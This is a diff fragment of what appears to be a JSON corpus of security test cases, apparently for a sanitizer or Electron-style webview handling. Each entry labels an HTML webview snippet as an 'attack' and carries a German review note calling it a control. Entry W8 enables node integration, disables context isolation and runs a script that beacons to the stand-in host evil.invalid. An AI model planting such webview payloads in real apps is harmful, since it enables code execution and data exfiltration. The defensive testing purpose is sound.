+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "r2 W6 webview preload attribute only",
+  "kind": "attack",
+  "html": "<webview preload=\"file:///tmp/none.js\" src=\"about:blank\"></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "r2 W7 webview about:blank + partition + allowpopups",
+  "kind": "attack",
+  "html": "<webview src=\"about:blank\" partition=\"persist:x\" allowpopups></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "r2 W8 webview data: nodeintegration + nodeintegrationinsubframes + webpreferences",
+  "kind": "attack",
+  "html": "<webview src=\"data:text/html,%3Cscript%3Enew%20Image().src%3D%27https%3A//evil.invalid/node-%27%2Btypeof%20require%3C/script%3E\" nodeintegration nodeintegrationinsubframes webpreferences=\"contextIsolation=no,nodeIntegration=yes\" style=\"width:50px;height:50px\"></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ }
+]
